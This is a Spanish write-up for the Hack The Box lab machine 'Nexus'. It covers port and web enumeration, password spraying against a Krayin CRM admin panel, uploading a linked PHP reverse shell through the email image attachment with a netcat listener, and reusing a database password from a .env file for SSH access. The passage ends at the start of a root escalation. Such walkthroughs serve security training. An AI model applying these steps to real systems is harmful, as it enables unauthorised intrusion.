@@ -1,0 +1,370 @@
+<!DOCTYPE html><!-- Layout específico para writeups en markdown. Muestra hero (si existe) y el contenido --><html lang="es" class="dark"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Writeup</title><script type="module">(function(){const t=localStorage.getItem("theme")||"dark";document.documentElement.classList.toggle("light",t==="light"),document.documentElement.classList.toggle("dark",t==="dark")})();</script><link rel="stylesheet" href="/assets/Footer.sk8r29IW.css"></head> <body class="bg-bg1 text-white"> <div class="min-h-screen flex flex-col"> <!-- Header reutiliza el componente global si está disponible --> <header class="w-full py-4"> <div class="container mx-auto flex items-center justify-between"> <a href="/" class="flex items-center gap-3"> <div> <div class="text-lg font-semibold">Angel Corral</div> <div class="text-xs text-slate-400">Informatica y Ciberseguridad</div> </div> </a> <nav class="flex items-center gap-6 text-sm"> <a href="/writeups">Writeups</a> <a href="/projects">Proyectos</a> <a href="/apuntes">Apuntes</a> <a href="/services">Servicios</a> <a href="/contact" class="px-3 py-1 rounded-md border">Contacto</a> <button id="theme-toggle" class="theme-toggle" aria-label="Cambiar tema" type="button"> <svg id="sun-icon" class="hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path> </svg> <svg id="moon-icon" class="block" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path> </svg> </button> <script type="module">(function(){const d=document.getElementById("theme-toggle"),e=document.getElementById("sun-icon"),t=document.getElementById("moon-icon"),s=document.documentElement;function n(){return localStorage.getItem("theme")||"dark"}function o(c){c==="light"?(s.classList.remove("dark"),s.classList.add("light"),e.classList.remove("hidden"),e.classList.add("block"),t.classList.remove("block"),t.classList.add("hidden")):(s.classList.remove("light"),s.classList.add("dark"),t.classList.remove("hidden"),t.classList.add("block"),e.classList.remove("block"),e.classList.add("hidden")),localStorage.setItem("theme",c)}const l=n();o(l),d.addEventListener("click",()=>{const i=n()==="light"?"dark":"light";o(i)})})();</script> </nav> </div> </header> <main class="container mx-auto px-6 py-10 flex-1"> <article class="max-w-3xl mx-auto">  <div class="prose prose-invert prose-xl max-w-none">   <article class="max-w-5xl mx-auto px-6 py-12"> <!-- ENCABEZADO --> <div class="mb-14 text-center"> <a href="/writeups" class="text-sm text-slate-400 hover:text-accentBlue transition-colors block mb-4">
+← Volver a Writeups
+</a> <h1 class="text-5xl font-bold bg-gradient-to-r from-accentBlue to-accentGreen text-transparent bg-clip-text mb-4"> Nexus Hack The Box </h1> <p class="text-slate-400 text-sm mb-2">2 de julio de 2026</p> <p class="text-lg text-slate-300 max-w-2xl mx-auto mb-6 leading-relaxed"> Resolución de la máquina Nexus de Hack The Box. Enumeración de repositorios Git expuestos en Gitea, filtración de credenciales en el historial de commits (.env) y acceso inicial a Krayin CRM. </p> </div> <!-- BLOQUE DE INFORMACIÓN TÉCNICA --> <section class="grid md:grid-cols-2 gap-6 mb-12 text-sm"> <div class="bg-slate-900/50 border border-slate-800 p-5 rounded-xl backdrop-blur-sm"> <h2 class="text-accentBlue text-lg font-semibold mb-3">
+Detalles Técnicos
+</h2> <ul class="space-y-2 text-slate-300">    <li> <strong>Dificultad:</strong> Easy </li> </ul> </div> <div class="bg-slate-900/50 border border-slate-800 p-5 rounded-xl backdrop-blur-sm"> <h2 class="text-accentGreen text-lg font-semibold mb-3">
+Etiquetas y Tecnología
+</h2> <div class="flex flex-wrap gap-2"> <span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> gitea </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> krayin-crm </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> git-history </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> leak </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> credentials </span> </div> </div> </section> <!-- IMAGEN DESTACADA -->  <div class="prose-writeup"> <h3 id="1--planificación-y-alcance">1. 📝 Planificación y Alcance</h3>
+<ul>
+<li>
+<p><strong>IP:</strong> <code>10.129.234.54</code></p>
+</li>
+<li>
+<p><strong>Dominio:</strong> <code>nexus.htb</code></p>
+</li>
+<li>
+<p><strong>Cliente:</strong> HTB</p>
+</li>
+<li>
+<p><strong>Fecha:</strong> 29/06/2026</p>
+</li>
+<li>
+<p><strong>Nivel:</strong> Easy-Linux</p>
+</li>
+</ul>
+<hr>
+<h2 id="2--escaneo-y-enumeración">2. 🔎 Escaneo y Enumeración</h2>
+<h3 id="21-escaneo-de-puertos">2.1 Escaneo de Puertos</h3>
+<p><strong>Comando:</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> nmap</span><span style="color:#BD93F9"> -sSCV</span><span style="color:#BD93F9"> -p-</span><span style="color:#BD93F9"> --open</span><span style="color:#BD93F9"> -T4</span><span style="color:#BD93F9"> -Pn</span><span style="color:#BD93F9"> -n</span><span style="color:#BD93F9"> -vvv</span><span style="color:#BD93F9"> -oN</span><span style="color:#F1FA8C"> escaneo_nmap.txt</span><span style="color:#BD93F9"> $target</span></span></code></pre>
+<h3 id="22-servicios-descubiertos">2.2 Servicios Descubiertos</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th><strong>Puerto</strong></th><th><strong>Servicio</strong></th><th><strong>Versión</strong></th></tr></thead><tbody><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 9.6p1 Ubuntu.</td></tr><tr><td>80/tcp</td><td>HTTP</td><td>Nginx 1.24.0</td></tr></tbody></table>
+<p>**DOMINIO: **<a href="http://nexus.htb/">http://nexus.htb/</a></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">10.129.234.54 nexus.htb</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> sudo</span><span style="color:#F1FA8C"> tee</span><span style="color:#BD93F9"> -a</span><span style="color:#F1FA8C"> /etc/hosts</span></span></code></pre>
+<h3 id="23-enumeración-web">2.3 Enumeración Web</h3>
+<p><strong>Comandos fuzzing:</strong></p>
+<p>Bash</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6272A4">#Directorios</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">gobuster</span><span style="color:#F1FA8C"> dir</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> http://</span><span style="color:#BD93F9">$target</span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt</span><span style="color:#BD93F9"> -x</span><span style="color:#F1FA8C"> html,php,txt,js,bak</span><span style="color:#BD93F9"> -t</span><span style="color:#BD93F9"> 100</span><span style="color:#BD93F9"> -k</span><span style="color:#BD93F9"> -r</span><span style="color:#BD93F9"> --exclude-length</span><span style="color:#BD93F9"> 49296</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4">#Subdominios</span></span>
+<span class="line"><span style="color:#50FA7B">ffuf</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> http://</span><span style="color:#BD93F9">$target</span><span style="color:#BD93F9"> -H</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">Host: FUZZ.TARGET.HTB</span><span style="color:#E9F284">"</span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span><span style="color:#BD93F9"> -fw</span><span style="color:#BD93F9"> 4</span><span style="color:#BD93F9"> -t</span><span style="color:#BD93F9"> 200</span><span style="color:#BD93F9"> -ac</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4">#Scaner Web</span></span>
+<span class="line"><span style="color:#50FA7B"> nuclei</span><span style="color:#BD93F9"> -target</span><span style="color:#F1FA8C"> http://</span><span style="color:#BD93F9">$target</span></span>
+<span class="line"><span style="color:#F8F8F2"> </span></span>
+<span class="line"><span style="color:#6272A4">#Descubrimiento de tecnologias</span></span>
+<span class="line"><span style="color:#50FA7B">whatweb</span><span style="color:#F1FA8C"> http://</span><span style="color:#BD93F9">$target</span></span></code></pre>
+<p><strong>Actualizar /etc/hosts</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">10.129.234.54</span><span style="color:#F1FA8C"> git.nexus.htb</span><span style="color:#F1FA8C"> billing.nexus.htb</span><span style="color:#F1FA8C"> nexus.htb</span></span></code></pre>
+<p><strong>Hallazgos Generales:</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6272A4">#ffuf</span></span>
+<span class="line"><span style="color:#50FA7B">git</span><span style="color:#F8F8F2">                     [Status: </span><span style="color:#F1FA8C">200,</span><span style="color:#F1FA8C"> Size:</span><span style="color:#F1FA8C"> 14474,</span><span style="color:#F1FA8C"> Words:</span><span style="color:#F1FA8C"> 1195,</span><span style="color:#F1FA8C"> Lines:</span><span style="color:#F1FA8C"> 242,</span><span style="color:#F1FA8C"> Duration:</span><span style="color:#F1FA8C"> 539ms]</span></span>
+<span class="line"><span style="color:#50FA7B">billing</span><span style="color:#F8F8F2">                 [Status: </span><span style="color:#F1FA8C">302,</span><span style="color:#F1FA8C"> Size:</span><span style="color:#F1FA8C"> 390,</span><span style="color:#F1FA8C"> Words:</span><span style="color:#F1FA8C"> 60,</span><span style="color:#F1FA8C"> Lines:</span><span style="color:#F1FA8C"> 12,</span><span style="color:#F1FA8C"> Duration:</span><span style="color:#F1FA8C"> 1720ms]</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">http://git.nexus.htb</span></span>
+<span class="line"><span style="color:#50FA7B">http://billing.nexus.htb</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4">#Feroxbuster</span></span>
+<span class="line"><span style="color:#50FA7B">http://billing.nexus.htb/admin/</span></span>
+<span class="line"><span style="color:#50FA7B">http://billing.nexus.htb/storage/</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4">#Gobuster -> http://git.nexus.htb</span></span>
+<span class="line"><span style="color:#50FA7B">admin</span><span style="color:#F8F8F2">                (Status: </span><span style="color:#BD93F9">200</span><span style="color:#F8F8F2">) [Size: 22803]</span></span>
+<span class="line"><span style="color:#50FA7B">issues</span><span style="color:#F8F8F2">               (Status: </span><span style="color:#BD93F9">200</span><span style="color:#F8F8F2">) [Size: 12912]</span></span>
+<span class="line"><span style="color:#50FA7B">v2</span><span style="color:#F8F8F2">                   (Status: </span><span style="color:#BD93F9">401</span><span style="color:#F8F8F2">) [Size: 49]</span></span>
+<span class="line"><span style="color:#50FA7B">robots.txt</span><span style="color:#F8F8F2">           (Status: </span><span style="color:#BD93F9">404</span><span style="color:#F8F8F2">) [Size: 19]</span></span>
+<span class="line"><span style="color:#50FA7B">explore</span><span style="color:#F8F8F2">              (Status: </span><span style="color:#BD93F9">200</span><span style="color:#F8F8F2">) [Size: 18625]</span></span>
+<span class="line"><span style="color:#50FA7B">milestones</span><span style="color:#F8F8F2">           (Status: </span><span style="color:#BD93F9">200</span><span style="color:#F8F8F2">) [Size: 12911]</span></span>
+<span class="line"><span style="color:#50FA7B">notifications</span><span style="color:#F8F8F2">        (Status: </span><span style="color:#BD93F9">200</span><span style="color:#F8F8F2">) [Size: 12912]</span></span>
+<span class="line"><span style="color:#50FA7B">jones</span><span style="color:#F8F8F2">                (Status: </span><span style="color:#BD93F9">200</span><span style="color:#F8F8F2">) [Size: 20221]</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4">#Whatweb</span></span>
+<span class="line"><span style="color:#50FA7B">http://nexus.htb</span><span style="color:#F8F8F2"> [200 </span><span style="color:#F1FA8C">OK]</span><span style="color:#F1FA8C"> Country[RESERVED][ZZ],</span><span style="color:#F1FA8C"> Email[careers@nexus.htb,j.matthew@nexus.htb],</span><span style="color:#F1FA8C"> HTML5,</span><span style="color:#F1FA8C"> HTTPServer[Ubuntu</span><span style="color:#F1FA8C"> Linux][nginx/1.24.0</span><span style="color:#F8F8F2"> (Ubuntu)], IP[10.129.234.54], Script, Title[Nexus Energy Authority — Powering the Nation</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">s Future], nginx[1.24.0]</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F1FA8C">http://git.nexus.htb [200 OK] Cookies[i_like_gitea], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], HttpOnly[i_like_gitea], IP[10.129.234.54], Meta-Author[Gitea - Git with a cup of tea], Open-Graph-Protocol[website], PoweredBy[Gitea], Script[module], Title[Gitea: Git with a cup of tea], X-Frame-Options[SAMEORIGIN], nginx[1.24.0]</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F1FA8C">http://billing.nexus.htb [302 Found] Cookies[XSRF-TOKEN,krayin_crm_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], HttpOnly[krayin_crm_session], IP[10.129.234.54], Meta-Refresh-Redirect[http://billing.nexus.htb/admin/login], RedirectLocation[http://billing.nexus.htb/admin/login], Title[Redirecting to http://billing.nexus.htb/admin/login], nginx[1.24.0]</span></span>
+<span class="line"><span style="color:#F1FA8C">http://billing.nexus.htb/admin/login [200 OK] Cookies[XSRF-TOKEN,krayin_crm_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], HttpOnly[krayin_crm_session], IP[10.129.234.54], PoweredBy[--], Script[module,text/javascript,text/x-template], Title[Sign In], UncommonHeaders[phpdebugbar-id], nginx[1.24.0]</span></span>
+<span class="line"></span>
+<span class="line"></span></code></pre>
+<p><strong>TECNOLOGIAS:</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">nginx/1.24.0</span></span>
+<span class="line"><span style="color:#50FA7B">http://git.nexus.htb</span><span style="color:#F8F8F2"> -</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C"> Powered</span><span style="color:#F1FA8C"> by</span><span style="color:#F1FA8C"> Gitea</span><span style="color:#F1FA8C"> Version:</span><span style="color:#BD93F9"> 1.26.0</span></span>
+<span class="line"><span style="color:#50FA7B">http://billing.nexus.htb/admin/login</span><span style="color:#F8F8F2"> -</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C"> Krayin</span><span style="color:#F1FA8C"> CRM</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4">#EMAILS</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">j.matthew@nexus.htb</span></span>
+<span class="line"><span style="color:#50FA7B">careers@nexus.htb</span></span>
+<span class="line"></span></code></pre>
+<p><strong>Hallazgos clave:</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">http://git.nexus.htb/admin/krayin-docker-setup</span></span></code></pre>
+<p><strong>CAPTURAS DE PANTALLA:</strong></p>
+<p><img alt="alt text" loading="lazy" decoding="async"  width="1381" height="917" src="/assets/nexus4.DqGm_jx5_1TKnfw.webp" ></p>
+<p><img alt="alt text" loading="lazy" decoding="async"  width="532" height="789" src="/assets/nexus6.CSzmQp_j_Z13SHEB.webp" ></p>
+<p><img alt="alt text" loading="lazy" decoding="async"  width="859" height="830" src="/assets/nexus5.-0Ft0Mr1_kOX8y.webp" ></p>
+<h2 id="3--explotación">3. 💥 Explotación</h2>
+<h3 id="31-vector-de-ataque">3.1 Vector de Ataque</h3>
+<p>Utilizando la información recolectada, se procedió a ejecutar una técnica de <em>password spraying</em> contra el panel de administración ubicado en <code>[http://billing.nexus.htb/admin/login](http://billing.nexus.htb/admin/login)</code>. El ataque consistió en validar la contraseña obtenida previamente frente a la lista de correos electrónicos extraídos durante la etapa de reconocimiento.</p>
+<p><img alt="alt text" loading="lazy" decoding="async"  width="356" height="479" src="/assets/nexus1.Cv7PyoS__Scx1.webp" ></p>
+<p><a href="http://billing.nexus.htb/admin/dashboard">http://billing.nexus.htb/admin/dashboard</a></p>
+<p><img alt="alt text" loading="lazy" decoding="async"  width="1920" height="851" src="/assets/nexus2.Cnf5Pjul_Z1GqxHb.webp" ></p>
+<ul>
+<li>
+<p><strong>Servicio:</strong> Krayin CRM</p>
+</li>
+<li>
+<p><strong>Vulnerabilidad:</strong> Credenciales obtenidas por exposición de información sensible..</p>
+</li>
+</ul>
+<h3 id="32-proceso-de-compromiso">3.2 Proceso de Compromiso</h3>
+<p><em>POC:</em>
+<a href="https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md">https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md</a></p>
+<p><em>Reverse shell PHP:</em>
+<a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php">https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php</a></p>
+<ol>
+<li>
+<p><strong>Creación del Payload:</strong> Script <code>rev.php</code> utilicé la reverse shell de pentestmonkey.</p>
+</li>
+<li>
+<p><strong>Ejecución:</strong> Carga el script a través de la opción adjuntar imagen en la opción crear Email del panel de Krayin CMS</p>
+</li>
+<li>
+<p><strong>Acceso:</strong> Activar  <code>nc -nlvp 4444</code> y acceder a <a href="http://billing.nexus.htb/storage/tinymce/50e06b188ab1e50b6d03ae11d041cda8.php">http://billing.nexus.htb/storage/tinymce/50e06b188ab1e50b6d03ae11d041cda8.php</a>, el codigo de la ruta la encontramos en la “Response”</p>
+</li>
+</ol>
+<p><img alt="alt text" loading="lazy" decoding="async"  width="1920" height="923" src="/assets/nexus3.NX5bztZa_Z1QvoIs.webp" ></p>
+<p>Estabilización de TTY:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">script</span><span style="color:#F1FA8C"> /dev/null</span><span style="color:#BD93F9"> -c</span><span style="color:#F1FA8C"> /bin/bash</span></span></code></pre>
+<h2 id="4--post-explotación-y-pivoting">4. 🔑 Post-Explotación y Pivoting</h2>
+<h3 id="41-enumeración-local">4.1 Enumeración Local</h3>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">grep</span><span style="color:#BD93F9"> -E</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">/home/|/root/</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C"> /etc/passwd</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> cut</span><span style="color:#BD93F9"> -d:</span><span style="color:#BD93F9"> -f1</span></span>
+<span class="line"><span style="color:#F8F8F2">    </span></span>
+<span class="line"><span style="color:#50FA7B">jones</span></span>
+<span class="line"><span style="color:#50FA7B">git</span></span></code></pre>
+<p><strong>Encontramos una contraseña en el archivo .env</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">www-data@nexus:~/krayin$</span><span style="color:#F1FA8C"> cat</span><span style="color:#F1FA8C"> .env</span></span>
+<span class="line"><span style="color:#50FA7B">cat</span><span style="color:#F1FA8C"> .env</span></span>
+<span class="line"><span style="color:#BD93F9">APP_NAME</span><span style="color:#FF79C6">=</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">Krayin CRM</span><span style="color:#E9F284">"</span></span>
+<span class="line"><span style="color:#BD93F9">APP_ENV</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">local</span></span>
+<span class="line"><span style="color:#BD93F9">APP_KEY</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">base64:n4swv+4YcBtCr1OPHBe69GxK06/</span><span style="color:#BD93F9">X1y1vCQU1SIMIC7Q</span><span style="color:#FF79C6">=</span></span>
+<span class="line"><span style="color:#BD93F9">APP_DEBUG</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">true</span></span>
+<span class="line"><span style="color:#BD93F9">APP_URL</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">http://billing.nexus.htb</span></span>
+<span class="line"><span style="color:#BD93F9">APP_TIMEZONE</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">Asia/Kolkata</span></span>
+<span class="line"><span style="color:#BD93F9">APP_LOCALE</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">en</span></span>
+<span class="line"><span style="color:#BD93F9">APP_CURRENCY</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">USD</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#BD93F9">VITE_HOST</span><span style="color:#FF79C6">=</span></span>
+<span class="line"><span style="color:#BD93F9">VITE_PORT</span><span style="color:#FF79C6">=</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#BD93F9">LOG_CHANNEL</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">stack</span></span>
+<span class="line"><span style="color:#BD93F9">LOG_LEVEL</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">debug</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#BD93F9">DB_CONNECTION</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">mysql</span></span>
+<span class="line"><span style="color:#BD93F9">DB_HOST</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">127.0.0.1</span></span>
+<span class="line"><span style="color:#BD93F9">DB_PORT</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">3306</span></span>
+<span class="line"><span style="color:#BD93F9">DB_DATABASE</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">krayin</span></span>
+<span class="line"><span style="color:#BD93F9">DB_USERNAME</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">krayin</span></span>
+<span class="line"><span style="color:#BD93F9">DB_PASSWORD</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">y27xb3ha!!74GbR</span></span>
+<span class="line"><span style="color:#BD93F9">DB_PREFIX</span><span style="color:#FF79C6">=</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#BD93F9">BROADCAST_DRIVER</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">log</span></span>
+<span class="line"><span style="color:#BD93F9">CACHE_DRIVER</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">file</span></span>
+<span class="line"><span style="color:#BD93F9">QUEUE_CONNECTION</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">sync</span></span>
+<span class="line"><span style="color:#BD93F9">SESSION_DRIVER</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">file</span></span>
+<span class="line"><span style="color:#BD93F9">SESSION_LIFETIME</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">120</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#BD93F9">MEMCACHED_HOST</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">127.0.0.1</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#BD93F9">REDIS_HOST</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">127.0.0.1</span></span>
+<span class="line"><span style="color:#BD93F9">REDIS_PASSWORD</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">null</span></span>
+<span class="line"><span style="color:#BD93F9">REDIS_PORT</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">6379</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#BD93F9">MAIL_MAILER</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">smtp</span></span>
+<span class="line"><span style="color:#BD93F9">MAIL_HOST</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">mailhog</span></span>
+<span class="line"><span style="color:#BD93F9">MAIL_PORT</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">1025</span></span>
+<span class="line"><span style="color:#BD93F9">MAIL_USERNAME</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">null</span></span>
+<span class="line"><span style="color:#BD93F9">MAIL_PASSWORD</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">null</span></span>
+<span class="line"><span style="color:#BD93F9">MAIL_ENCRYPTION</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">null</span></span>
+<span class="line"><span style="color:#BD93F9">MAIL_FROM_ADDRESS</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">laravel@krayincrm.com</span></span>
+<span class="line"><span style="color:#BD93F9">MAIL_FROM_NAME</span><span style="color:#FF79C6">=</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">${</span><span style="color:#BD93F9">APP_NAME</span><span style="color:#F1FA8C">}</span><span style="color:#E9F284">"</span></span>
+<span class="line"><span style="color:#BD93F9">MAIL_DOMAIN</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">webkul.com</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#BD93F9">MAIL_RECEIVER_DRIVER</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">sendgrid</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#BD93F9">IMAP_HOST</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">imap.example.com</span></span>
+<span class="line"><span style="color:#BD93F9">IMAP_PORT</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">993</span></span>
+<span class="line"><span style="color:#BD93F9">IMAP_ENCRYPTION</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">ssl</span></span>
+<span class="line"><span style="color:#BD93F9">IMAP_VALIDATE_CERT</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">true</span></span>
+<span class="line"><span style="color:#BD93F9">IMAP_USERNAME</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">your_username</span></span>
+<span class="line"><span style="color:#BD93F9">IMAP_PASSWORD</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">your_password</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#BD93F9">AWS_ACCESS_KEY_ID</span><span style="color:#FF79C6">=</span></span>
+<span class="line"><span style="color:#BD93F9">AWS_SECRET_ACCESS_KEY</span><span style="color:#FF79C6">=</span></span>
+<span class="line"><span style="color:#BD93F9">AWS_DEFAULT_REGION</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">us-east-1</span></span>
+<span class="line"><span style="color:#BD93F9">AWS_BUCKET</span><span style="color:#FF79C6">=</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#BD93F9">PUSHER_APP_ID</span><span style="color:#FF79C6">=</span></span>
+<span class="line"><span style="color:#BD93F9">PUSHER_APP_KEY</span><span style="color:#FF79C6">=</span></span>
+<span class="line"><span style="color:#BD93F9">PUSHER_APP_SECRET</span><span style="color:#FF79C6">=</span></span>
+<span class="line"><span style="color:#BD93F9">PUSHER_APP_CLUSTER</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">mt1</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#BD93F9">MIX_PUSHER_APP_KEY</span><span style="color:#FF79C6">=</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">${</span><span style="color:#BD93F9">PUSHER_APP_KEY</span><span style="color:#F1FA8C">}</span><span style="color:#E9F284">"</span></span>
+<span class="line"><span style="color:#BD93F9">MIX_PUSHER_APP_CLUSTER</span><span style="color:#FF79C6">=</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">${</span><span style="color:#BD93F9">PUSHER_APP_CLUSTER</span><span style="color:#F1FA8C">}</span><span style="color:#E9F284">"</span></span></code></pre>
+<h3 id="42-escalada-de-privilegios">4.2 Escalada de Privilegios</h3>
+<ol>
+<li><strong>Acceso SSH:</strong> Uso de credenciales de <code>jones</code>.</li>
+</ol>
+<p>[22][ssh] host: 10.129.234.54   login: jones   password: y27xb3ha!!74GbR</p>
+<h2 id="5-️-escalada-a-root">5. 🛡️ Escalada a Root</h2>
+<p><strong>Método:</strong> Uso de <code>rest-server</code> externo para orquestar backup del directorio <code>/root</code>.
